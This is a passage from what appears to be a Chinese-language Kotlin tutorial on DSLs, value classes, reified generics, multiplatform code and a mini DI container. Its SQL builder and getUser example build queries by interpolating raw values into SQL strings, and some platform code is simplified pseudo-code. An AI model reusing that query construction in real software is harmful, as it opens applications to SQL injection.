    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">eq</span><span class="hljs-params">(value: <span class="hljs-type">Any</span>)</span></span> = <span class="hljs-string">"<span class="hljs-variable">$this</span> = '<span class="hljs-variable">$value</span>'"</span>
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> String.`<span class="hljs-keyword">in</span>`<span class="hljs-params">(values: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Any</span>&gt;)</span></span> = 
        <span class="hljs-string">"<span class="hljs-variable">$this</span> IN (<span class="hljs-subst">${values.joinToString { <span class="hljs-string">"'<span class="hljs-variable">$it</span>'"</span> }</span>})"</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">from</span><span class="hljs-params">(tableName: <span class="hljs-type">String</span>)</span></span> {
        table = tableName
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">where</span><span class="hljs-params">(condition: <span class="hljs-type">String</span>)</span></span> {
        conditions.add(condition)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">join</span><span class="hljs-params">(table: <span class="hljs-type">String</span>, on: <span class="hljs-type">String</span>)</span></span> {
        joins.add(<span class="hljs-string">"JOIN <span class="hljs-variable">$table</span> ON <span class="hljs-variable">$on</span>"</span>)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">limit</span><span class="hljs-params">(count: <span class="hljs-type">Int</span>)</span></span> {
        limit = count
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> query = StringBuilder(<span class="hljs-string">"SELECT * FROM <span class="hljs-variable">$table</span>"</span>)
        
        <span class="hljs-keyword">if</span> (joins.isNotEmpty()) {
            query.append(<span class="hljs-string">" "</span>).append(joins.joinToString(<span class="hljs-string">" "</span>))
        }
        
        <span class="hljs-keyword">if</span> (conditions.isNotEmpty()) {
            query.append(<span class="hljs-string">" WHERE "</span>).append(conditions.joinToString(<span class="hljs-string">" AND "</span>))
        }
        
        limit?.let {
            query.append(<span class="hljs-string">" LIMIT <span class="hljs-variable">$it</span>"</span>)
        }
        
        <span class="hljs-keyword">return</span> query.toString()
    }
}

<span class="hljs-comment">// 2. 使用 DSL 构建 SQL</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testSqlBuilder</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> query = SqlBuilder().apply {
        from(<span class="hljs-string">"users"</span>)
        <span class="hljs-keyword">where</span>(<span class="hljs-string">"name"</span> eq <span class="hljs-string">"Alice"</span>)
        <span class="hljs-keyword">where</span>(<span class="hljs-string">"age"</span> `<span class="hljs-keyword">in</span>` listOf(<span class="hljs-number">25</span>, <span class="hljs-number">30</span>, <span class="hljs-number">35</span>))
        join(<span class="hljs-string">"orders"</span>, <span class="hljs-string">"users.id = orders.user_id"</span>)
        limit(<span class="hljs-number">10</span>)
    }.build()
    
    println(<span class="hljs-string">"生成的 SQL: <span class="hljs-variable">$query</span>"</span>)
}
</code></pre>
<h5 data-id="heading-6"><strong>2. 类型安全构建器进阶</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 类型安全的 HTTP 请求构建器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpRequestBuilder</span> {
    <span class="hljs-keyword">var</span> method: String = <span class="hljs-string">"GET"</span>
    <span class="hljs-keyword">var</span> url: String = <span class="hljs-string">""</span>
    <span class="hljs-keyword">val</span> headers = mutableMapOf&lt;String, String&gt;()
    <span class="hljs-keyword">var</span> body: String = <span class="hljs-string">""</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">method</span><span class="hljs-params">(method: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.method = method
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">url</span><span class="hljs-params">(url: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.url = url
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">header</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, value: <span class="hljs-type">String</span>)</span></span> {
        headers[name] = value
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">(content: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.body = content
        header(<span class="hljs-string">"Content-Length"</span>, content.length.toString())
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-comment">// 模拟 HTTP 请求</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"HTTP <span class="hljs-variable">$method</span> <span class="hljs-variable">$url</span> - Headers: <span class="hljs-variable">$headers</span> - Body: <span class="hljs-variable">$body</span>"</span>
    }
}

<span class="hljs-comment">// DSL 扩展函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">httpRequest</span><span class="hljs-params">(block: <span class="hljs-type">HttpRequestBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: String {
    <span class="hljs-keyword">val</span> builder = HttpRequestBuilder()
    builder.block()
    <span class="hljs-keyword">return</span> builder.execute()
}

<span class="hljs-comment">// 使用类型安全构建器</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testHttpBuilder</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> response = httpRequest {
        method = <span class="hljs-string">"POST"</span>
        url = <span class="hljs-string">"https://api.example.com/users"</span>
        header(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer token123"</span>)
        header(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/json"</span>)
        body = <span class="hljs-string">"""{"name": "Alice", "age": 25}"""</span>
    }
    
    println(<span class="hljs-string">"HTTP 响应: <span class="hljs-variable">$response</span>"</span>)
}
</code></pre>
<h4 data-id="heading-7"><strong>四十一、深度性能优化技术</strong></h4>
<h5 data-id="heading-8"><strong>1. 内联类与值类的性能优化</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">Meter</span>(<span class="hljs-keyword">val</span> value: <span class="hljs-built_in">Double</span>) {
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">plus</span><span class="hljs-params">(other: <span class="hljs-type">Meter</span>)</span></span>: Meter = Meter(value + other.value)
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">times</span><span class="hljs-params">(factor: <span class="hljs-type">Double</span>)</span></span>: Meter = Meter(value * factor)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toKilometers</span><span class="hljs-params">()</span></span>: Kilometer = Kilometer(value / <span class="hljs-number">1000.0</span>)
}

<span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">Kilometer</span>(<span class="hljs-keyword">val</span> value: <span class="hljs-built_in">Double</span>) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toMeters</span><span class="hljs-params">()</span></span>: Meter = Meter(value * <span class="hljs-number">1000.0</span>)
}

<span class="hljs-comment">// 使用内联类进行类型安全计算</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">calculateDistance</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> distance1 = Meter(<span class="hljs-number">500.0</span>)
    <span class="hljs-keyword">val</span> distance2 = Meter(<span class="hljs-number">300.0</span>)
    <span class="hljs-keyword">val</span> total = distance1 + distance2
    <span class="hljs-keyword">val</span> scaled = total * <span class="hljs-number">2.5</span>
    
    println(<span class="hljs-string">"总距离: <span class="hljs-subst">${total.value}</span> 米"</span>)
    println(<span class="hljs-string">"缩放后: <span class="hljs-subst">${scaled.value}</span> 米"</span>)
    println(<span class="hljs-string">"转换为公里: <span class="hljs-subst">${scaled.toKilometers().value}</span> 公里"</span>)
    
    <span class="hljs-comment">// 编译错误：类型安全</span>
    <span class="hljs-comment">// val invalid = distance1 + scaled.toKilometers() // 编译错误！</span>
}

<span class="hljs-comment">// 内联类的集合操作优化</span>
<span class="hljs-meta">@JvmInline</span>
value <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserId</span>(<span class="hljs-keyword">val</span> value: <span class="hljs-built_in">Int</span>)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">optimizeCollections</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> userIds = listOf(UserId(<span class="hljs-number">1</span>), UserId(<span class="hljs-number">2</span>), UserId(<span class="hljs-number">3</span>))
    
    <span class="hljs-comment">// 这些操作在运行时不会产生包装对象开销</span>
    <span class="hljs-keyword">val</span> mapped = userIds.map { it.value * <span class="hljs-number">2</span> }
    <span class="hljs-keyword">val</span> filtered = userIds.filter { it.value &gt; <span class="hljs-number">1</span> }
    
    println(<span class="hljs-string">"映射结果: <span class="hljs-variable">$mapped</span>"</span>)
    println(<span class="hljs-string">"过滤结果: <span class="hljs-variable">$filtered</span>"</span>)
}
</code></pre>
<h5 data-id="heading-9"><strong>2. 内联函数与 reified 类型参数的高级用法</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.reflect.KClass

<span class="hljs-comment">// 高级 reified 用法</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T : Any&gt;</span> <span class="hljs-title">createInstance</span><span class="hljs-params">(<span class="hljs-keyword">vararg</span> args: <span class="hljs-type">Any</span>)</span></span>: T {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (T::<span class="hljs-keyword">class</span>) {
        String::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-string">""</span> <span class="hljs-keyword">as</span> T
        <span class="hljs-built_in">Int</span>::<span class="hljs-keyword">class</span> -&gt; <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> T
        List::<span class="hljs-keyword">class</span> -&gt; emptyList&lt;Any&gt;() <span class="hljs-keyword">as</span> T
        Map::<span class="hljs-keyword">class</span> -&gt; emptyMap&lt;Any, Any&gt;() <span class="hljs-keyword">as</span> T
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-keyword">throw</span> IllegalArgumentException(<span class="hljs-string">"不支持的类型"</span>)
    }
}

<span class="hljs-comment">// 类型安全的验证框架</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T&gt;</span> <span class="hljs-title">validate</span><span class="hljs-params">(value: <span class="hljs-type">Any</span>, validator: <span class="hljs-type">T</span>.() -&gt; <span class="hljs-type">Boolean</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">is</span> T) {
        value.validator()
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-literal">false</span>
    }
}

<span class="hljs-comment">// 使用高级内联函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testAdvancedInline</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> stringInstance: String = createInstance()
    <span class="hljs-keyword">val</span> listInstance: List&lt;Any&gt; = createInstance()
    
    println(<span class="hljs-string">"创建的实例: <span class="hljs-variable">$stringInstance</span>, <span class="hljs-variable">$listInstance</span>"</span>)
    
    <span class="hljs-comment">// 类型安全验证</span>
    <span class="hljs-keyword">val</span> email = <span class="hljs-string">"test@example.com"</span>
    <span class="hljs-keyword">val</span> isValidEmail = validate(email) {
        contains(<span class="hljs-string">"@"</span>) &amp;&amp; length &gt; <span class="hljs-number">5</span>
    }
    
    <span class="hljs-keyword">val</span> number = <span class="hljs-number">42</span>
    <span class="hljs-keyword">val</span> isValidNumber = validate(number) {
        <span class="hljs-keyword">this</span> <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.100</span>
    }
    
    println(<span class="hljs-string">"邮箱验证: <span class="hljs-variable">$isValidEmail</span>"</span>)
    println(<span class="hljs-string">"数字验证: <span class="hljs-variable">$isValidNumber</span>"</span>)
}
</code></pre>
<h4 data-id="heading-10"><strong>四十二、Kotlin 多平台项目（KMP）高级特性</strong></h4>
<h5 data-id="heading-11"><strong>1. 共享业务逻辑与平台特定实现</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 通用业务模型</span>
<span class="hljs-keyword">expect</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeFormatter</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">format</span><span class="hljs-params">(timestamp: <span class="hljs-type">Long</span>)</span></span>: String
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">parse</span><span class="hljs-params">(dateString: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Long</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EventLogger</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> formatter: DateTimeFormatter) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> events = mutableListOf&lt;String&gt;()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">logEvent</span><span class="hljs-params">(event: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">val</span> timestamp = System.currentTimeMillis()
        <span class="hljs-keyword">val</span> formattedTime = formatter.format(timestamp)
        events.add(<span class="hljs-string">"[<span class="hljs-variable">$formattedTime</span>] <span class="hljs-variable">$event</span>"</span>)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getEvents</span><span class="hljs-params">()</span></span>: List&lt;String&gt; = events.toList()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">clear</span><span class="hljs-params">()</span></span> {
        events.clear()
    }
}

<span class="hljs-comment">// Android 实现</span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeFormatter</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">format</span><span class="hljs-params">(timestamp: <span class="hljs-type">Long</span>)</span></span>: String {
        <span class="hljs-comment">// 使用 Android 的 DateFormat</span>
        <span class="hljs-keyword">return</span> android.text.format.DateFormat.format(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>, timestamp).toString()
    }
    
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">parse</span><span class="hljs-params">(dateString: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Long</span> {
        <span class="hljs-comment">// Android 特定的解析逻辑</span>
        <span class="hljs-keyword">return</span> java.text.SimpleDateFormat(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>).parse(dateString).time
    }
}

<span class="hljs-comment">// iOS 实现  </span>
<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateTimeFormatter</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">format</span><span class="hljs-params">(timestamp: <span class="hljs-type">Long</span>)</span></span>: String {
        <span class="hljs-comment">// 使用 iOS 的 DateFormatter</span>
        <span class="hljs-keyword">val</span> formatter = iosFoundation.NSDateFormatter()
        formatter.dateFormat = <span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>
        <span class="hljs-keyword">return</span> formatter.stringFromDate(iosFoundation.NSDate(timestamp))
    }
    
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">parse</span><span class="hljs-params">(dateString: <span class="hljs-type">String</span>)</span></span>: <span class="hljs-built_in">Long</span> {
        <span class="hljs-keyword">val</span> formatter = iosFoundation.NSDateFormatter()
        formatter.dateFormat = <span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>
        <span class="hljs-keyword">return</span> formatter.dateFromString(dateString)?.timeIntervalSince1970?.toLong() ?: <span class="hljs-number">0L</span>
    }
}
</code></pre>
<h5 data-id="heading-12"><strong>2. KMP 中的并发处理</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">expect</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlatformCoroutineDispatcher</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(block: () -&gt; <span class="hljs-type">Unit</span>)</span></span>
}

<span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlatformCoroutineDispatcher</span> <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>() {
    <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(block: () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        <span class="hljs-comment">// Android: Handler(Looper.getMainLooper()).post(block)</span>
        <span class="hljs-comment">// iOS: DispatchQueue.main.async { block() }</span>
        block() <span class="hljs-comment">// 简化实现</span>
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CrossPlatformService</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> dispatcher: PlatformCoroutineDispatcher) {
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">()</span></span>: String = withContext(createDispatcherContext(dispatcher)) {
        delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// 模拟网络请求</span>
        <span class="hljs-string">"跨平台数据"</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createDispatcherContext</span><span class="hljs-params">(dispatcher: <span class="hljs-type">PlatformCoroutineDispatcher</span>)</span></span> = 
        <span class="hljs-keyword">object</span> : CoroutineDispatcher() {
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(context: <span class="hljs-type">CoroutineContext</span>, block: <span class="hljs-type">Runnable</span>)</span></span> {
                dispatcher.dispatch { block.run() }
            }
        }
}
</code></pre>
<h4 data-id="heading-13"><strong>四十三、Kotlin 未来特性探索</strong></h4>
<h5 data-id="heading-14"><strong>1. 上下文接收器（Context Receivers）原型</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 模拟上下文接收器功能</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">DatabaseContext</span> {
    <span class="hljs-keyword">val</span> connection: DatabaseConnection
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">LoggingContext</span> {
    <span class="hljs-keyword">val</span> logger: Logger
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseConnection</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">executeQuery</span><span class="hljs-params">(sql: <span class="hljs-type">String</span>)</span></span>: String = <span class="hljs-string">"查询结果: <span class="hljs-variable">$sql</span>"</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Logger</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">info</span><span class="hljs-params">(message: <span class="hljs-type">String</span>)</span></span> = println(<span class="hljs-string">"[INFO] <span class="hljs-variable">$message</span>"</span>)
}

<span class="hljs-comment">// 使用上下文参数模拟上下文接收器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> dbContext: DatabaseContext,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> logContext: LoggingContext
) {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getUser</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: String {
        logContext.logger.info(<span class="hljs-string">"获取用户 <span class="hljs-variable">$id</span>"</span>)
        <span class="hljs-keyword">return</span> dbContext.connection.executeQuery(<span class="hljs-string">"SELECT * FROM users WHERE id = <span class="hljs-variable">$id</span>"</span>)
    }
}

<span class="hljs-comment">// 简化使用方式</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testContextReceivers</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> dbContext = <span class="hljs-keyword">object</span> : DatabaseContext {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> connection = DatabaseConnection()
    }
    
    <span class="hljs-keyword">val</span> logContext = <span class="hljs-keyword">object</span> : LoggingContext {
        <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> logger = Logger()
    }
    
    <span class="hljs-keyword">val</span> userService = UserService(dbContext, logContext)
    <span class="hljs-keyword">val</span> result = userService.getUser(<span class="hljs-number">1</span>)
    println(result)
}
</code></pre>
<h5 data-id="heading-15"><strong>2. 自定义操作符与 DSL 深度集成</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 自定义数学 DSL</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Vector</span>(<span class="hljs-keyword">val</span> x: <span class="hljs-built_in">Double</span>, <span class="hljs-keyword">val</span> y: <span class="hljs-built_in">Double</span>, <span class="hljs-keyword">val</span> z: <span class="hljs-built_in">Double</span>) {
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">plus</span><span class="hljs-params">(other: <span class="hljs-type">Vector</span>)</span></span>: Vector = 
        Vector(x + other.x, y + other.y, z + other.z)
    
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">minus</span><span class="hljs-params">(other: <span class="hljs-type">Vector</span>)</span></span>: Vector =
        Vector(x - other.x, y - other.y, z - other.z)
    
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">times</span><span class="hljs-params">(scalar: <span class="hljs-type">Double</span>)</span></span>: Vector =
        Vector(x * scalar, y * scalar, z * scalar)
    
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">dot</span><span class="hljs-params">(other: <span class="hljs-type">Vector</span>)</span></span>: <span class="hljs-built_in">Double</span> =
        x * other.x + y * other.y + z * other.z
    
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">cross</span><span class="hljs-params">(other: <span class="hljs-type">Vector</span>)</span></span>: Vector =
        Vector(
            y * other.z - z * other.y,
            z * other.x - x * other.z,
            x * other.y - y * other.x
        )
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"(<span class="hljs-variable">$x</span>, <span class="hljs-variable">$y</span>, <span class="hljs-variable">$z</span>)"</span>
}

<span class="hljs-comment">// 向量运算 DSL</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">vector</span><span class="hljs-params">(block: <span class="hljs-type">VectorBuilder</span>.() -&gt; <span class="hljs-type">Unit</span>)</span></span>: Vector {
    <span class="hljs-keyword">val</span> builder = VectorBuilder()
    builder.block()
    <span class="hljs-keyword">return</span> builder.build()
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">VectorBuilder</span> {
    <span class="hljs-keyword">var</span> x = <span class="hljs-number">0.0</span>
    <span class="hljs-keyword">var</span> y = <span class="hljs-number">0.0</span>
    <span class="hljs-keyword">var</span> z = <span class="hljs-number">0.0</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">x</span><span class="hljs-params">(value: <span class="hljs-type">Double</span>)</span></span> { x = value }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">y</span><span class="hljs-params">(value: <span class="hljs-type">Double</span>)</span></span> { y = value }
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">z</span><span class="hljs-params">(value: <span class="hljs-type">Double</span>)</span></span> { z = value }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: Vector = Vector(x, y, z)
}

<span class="hljs-comment">// 使用向量 DSL</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testVectorDSL</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> v1 = vector { x(<span class="hljs-number">1.0</span>); y(<span class="hljs-number">2.0</span>); z(<span class="hljs-number">3.0</span>) }
    <span class="hljs-keyword">val</span> v2 = vector { x(<span class="hljs-number">4.0</span>); y(<span class="hljs-number">5.0</span>); z(<span class="hljs-number">6.0</span>) }
    
    <span class="hljs-keyword">val</span> sum = v1 + v2
    <span class="hljs-keyword">val</span> difference = v1 - v2
    <span class="hljs-keyword">val</span> scaled = v1 * <span class="hljs-number">2.5</span>
    <span class="hljs-keyword">val</span> dotProduct = v1 dot v2
    <span class="hljs-keyword">val</span> crossProduct = v1 cross v2
    
    println(<span class="hljs-string">"向量运算结果:"</span>)
    println(<span class="hljs-string">"和: <span class="hljs-variable">$sum</span>"</span>)
    println(<span class="hljs-string">"差: <span class="hljs-variable">$difference</span>"</span>)
    println(<span class="hljs-string">"缩放: <span class="hljs-variable">$scaled</span>"</span>)
    println(<span class="hljs-string">"点积: <span class="hljs-variable">$dotProduct</span>"</span>)
    println(<span class="hljs-string">"叉积: <span class="hljs-variable">$crossProduct</span>"</span>)
}
</code></pre>
<h4 data-id="heading-16"><strong>四十四、Kotlin 元编程终极实战：构建迷你框架</strong></h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> kotlin.reflect.full.*

<span class="hljs-comment">// 迷你依赖注入框架</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DIContainer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> instances = mutableMapOf&lt;KClass&lt;*&gt;, Any&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> bindings = mutableMapOf&lt;KClass&lt;*&gt;, KClass&lt;*&gt;&gt;()
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Any&gt;</span> <span class="hljs-title">register</span><span class="hljs-params">(clazz: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        instances[clazz] = createInstance(clazz)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Any&gt;</span> <span class="hljs-title">register</span><span class="hljs-params">(interfaceClass: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;, implementationClass: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">T</span>&gt;)</span></span> {
        bindings[interfaceClass] = implementationClass
    }
    
    <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;<span class="hljs-keyword">reified</span> T : Any&gt;</span> <span class="hljs-title">get</span><span class="hljs-params">()</span></span>: T {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">get</span>(T::<span class="hljs-keyword">class</span>)
    }
    
    <span class="hljs-meta">@Suppress(<span class="hljs-string">"UNCHECKED_CAST"</span>)</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Any&gt;</span> <span class="hljs-title">get</span><span class="hljs-params">(clazz: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>: T {
        <span class="hljs-comment">// 检查单例实例</span>
        <span class="hljs-keyword">if</span> (instances.containsKey(clazz)) {
            <span class="hljs-keyword">return</span> instances[clazz] <span class="hljs-keyword">as</span> T
        }
        
        <span class="hljs-comment">// 检查接口绑定</span>
        <span class="hljs-keyword">val</span> targetClass = bindings[clazz] ?: clazz
        
        <span class="hljs-comment">// 创建新实例</span>
        <span class="hljs-keyword">val</span> instance = createInstance(targetClass <span class="hljs-keyword">as</span> KClass&lt;T&gt;)
        
        <span class="hljs-comment">// 如果是单例，保存实例</span>
        <span class="hljs-keyword">if</span> (targetClass.hasAnnotation&lt;Singleton&gt;()) {
            instances[clazz] = instance
        }
        
        <span class="hljs-keyword">return</span> instance
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Any&gt;</span> <span class="hljs-title">createInstance</span><span class="hljs-params">(clazz: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>: T {
